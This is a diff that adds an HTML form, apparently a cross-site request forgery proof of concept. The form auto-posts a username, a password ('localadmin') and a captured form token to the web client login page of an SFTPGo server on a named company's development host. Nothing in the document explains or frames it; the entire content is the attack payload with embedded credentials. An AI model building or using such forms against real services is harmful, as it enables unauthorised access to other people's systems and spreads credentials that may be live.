@@ -1,0 +1,11 @@
+<form action="https://dev-sftpgo.zalaris.com/web/client/login" method="POST">
+
+      <input type="hidden" name="username" value="localadminn" />
+
+      <input type="hidden" name="password" value="localadmin" />
+
+      <input type="hidden" name="&#95;form&#95;token" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&#46;eyJhdWQiOlsiQ1NSRiIsIjE3Mi4yOS4yOS41Il0sImV4cCI6MTc1MDg3ODk4MiwianRpIjoiZDFkdmQ5ajg0OTVjNzM5MDlibDAiLCJuYmYiOjE3NTA4NTczNTJ9&#46;si1CXLPO1Dy4QgO6D&#45;Kr5&#45;T11LaFI7YFZb3IfjisDQk" />
+
+      <input type="submit" value="Submit request" />
+
+    </form>
